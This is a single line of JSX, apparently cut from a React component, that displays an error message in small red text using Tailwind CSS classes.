                <p className="text-xs text-red-300 flex-1 leading-relaxed">{error}</p>
